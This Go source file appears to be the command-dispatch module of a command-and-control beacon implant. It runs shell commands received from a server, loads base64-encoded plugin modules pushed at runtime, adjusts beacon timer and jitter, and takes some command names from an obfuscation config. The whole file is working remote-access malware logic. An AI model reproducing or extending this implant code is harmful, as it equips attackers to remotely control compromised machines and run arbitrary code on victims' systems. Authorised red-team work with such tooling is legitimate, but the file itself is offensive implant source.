package beaconhandler

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	httpFuncs "src/Client/beacon/http"
	"src/Client/generic/commands"
	"src/Client/generic/config"
	"src/Client/generic/logger"
	"src/Client/generic/rpc_client"
)

// commandHandlerFunc defines the signature for command handlers.
type commandHandlerFunc func(httpFuncs.CommandData, string) (string, bool)

// handlers holds all command handlers, including dynamically added modules.
var handlers = make(map[string]commandHandlerFunc)

// ModuleData is the expected structure for the 'module' command's data.
type ModuleData struct {
	Name string `json:"name"`
	Data []byte `json:"data"`
}

// init registers built-in command handlers.
func init() {
	handlers["session"] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
		logger.Log("switching to 'session' mode")
		return "ack", true
	}
	handlers[config.Obfuscation.Generic.Commands.Shell.Name] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
		logger.Log("Processing 'shell' command.")
		commands, err := commands.BeaconShellCommand(data)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to process 'shell' command: %v", err))
			return "Error: Failed to process 'shell' command: " + err.Error(), false
		}
		return commands, false
	}
	handlers["update"] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
		logger.Log("Processing 'update' command.")
		return handleUpdateCommand(cmd.Data), false
	}
	// module loader remains special case
	handlers[config.Obfuscation.Generic.Commands.Module.Name] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
		logger.Log("Loading dynamic content for 'module' command.")
		var moduleData struct {
			Name string `json:"name"`
			Data string `json:"data"`
		}
		if err := json.Unmarshal(cmd.Data, &moduleData); err != nil {
			logger.Error(fmt.Sprintf("Failed to unmarshal module command data: %v. Data: %s", err, string(cmd.Data)))
			return "Error: Malformed data for 'module' command: " + err.Error(), false
		}
		decodedData, err := base64.StdEncoding.DecodeString(moduleData.Data)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to base64 decode module data: %v", err))
			return "Error: Failed to base64 decode module data: " + err.Error(), false
		}
		if err := rpc_client.LoadDynamicCommandFromBeacon(moduleData.Name, decodedData); err != nil {
			logger.Error(fmt.Sprintf("Failed to load %s plugin: %v", moduleData.Name, err))
			return fmt.Sprintf("Error loading module %s: %v", moduleData.Name, err), false
		}
		return fmt.Sprintf("Module %s loaded successfully", moduleData.Name), false
	}
}

// executeCommand dispatches a single command to the appropriate handler and returns its report and a bool on whether
// to switch to session mode.
func executeCommand(command httpFuncs.CommandData) (httpFuncs.CommandReport, bool) {
	if command.Command == "" || command.CommandUUID == "" {
		logger.Error("Invalid command format received (empty command or uuid).")
		return httpFuncs.CommandReport{
			Output:      "Error: Invalid command format from server.",
			CommandUUID: command.CommandUUID,
		}, false
	}
	var commandData string
	if command.Command != "update" {
		commandData = string(command.Data)
	}

	logger.Log(fmt.Sprintf("Executing command: '%s' (uuid: %s)", command.Command, command.CommandUUID))
	var outputMsg string

	var switchSession bool
	handler, exists := handlers[command.Command]
	if exists {
		outputMsg, switchSession = handler(command, commandData)
	} else if rpc_client.HasCommand(command.Command) {
		logger.Log(fmt.Sprintf("Executing dynamic command: '%s'", command.Command))
		var err error
		outputMsg, err = rpc_client.ExecuteFromBeacon(command.Command, []string{}, commandData)
		if err != nil {
			outputMsg = fmt.Sprintf("Error executing %s: %v", command.Command, err)
		}
	} else {
		logger.Log(fmt.Sprintf("list of handlers"))
		logger.Log(fmt.Sprintf("Processing generic command: '%s'", command.Command))
		outputMsg = handleGenericCommand(command)
	}

	return httpFuncs.CommandReport{Output: outputMsg, CommandUUID: command.CommandUUID}, switchSession
}

// handleUpdateCommand processes the 'update' command, modifying the agent's config.
func handleUpdateCommand(data json.RawMessage) string {
	logger.Log("Handling 'update' command with provided data.")
	var updateData httpFuncs.UpdateCommandPayload
	if err := json.Unmarshal(data, &updateData); err != nil {
		logger.Error(fmt.Sprintf("Failed to unmarshal update command data: %v. Data: %s", err, string(data)))
		return "Error: Malformed data for 'update' command: " + err.Error()
	}

	var outputMsgs []string
	config.ConfigMutex.Lock()
	defer config.ConfigMutex.Unlock()

	if updateData.Timer > 0 {
		config.Timer = updateData.Timer
		outputMsgs = append(outputMsgs, fmt.Sprintf("Timer set to %f", config.Timer))
		logger.Log(fmt.Sprintf("Timer updated to %f seconds", config.Timer))
	}
	if updateData.Jitter >= 0 {
		config.Jitter = updateData.Jitter
		outputMsgs = append(outputMsgs, fmt.Sprintf("Jitter set to %f", config.Jitter))
		logger.Log(fmt.Sprintf("Jitter updated to %f seconds", config.Jitter))
	}

	if len(outputMsgs) == 0 {
		logger.Warn("No valid timer or jitter values provided in update command.")
		return "Error: No valid timer or jitter values provided."
	}
	return strings.Join(outputMsgs, ", ")
}

// handleGenericCommand processes any command that isn't a special case.
func handleGenericCommand(command httpFuncs.CommandData) string {
	var cmdDataStr string
	if err := json.Unmarshal(command.Data, &cmdDataStr); err != nil {
		// If data isn't a simple string, use its raw representation.
		cmdDataStr = string(command.Data)
		if cmdDataStr == "null" {
			cmdDataStr = ""
		}
	}
	return fmt.Sprintf("Output for command '%s'", command.Command)
}
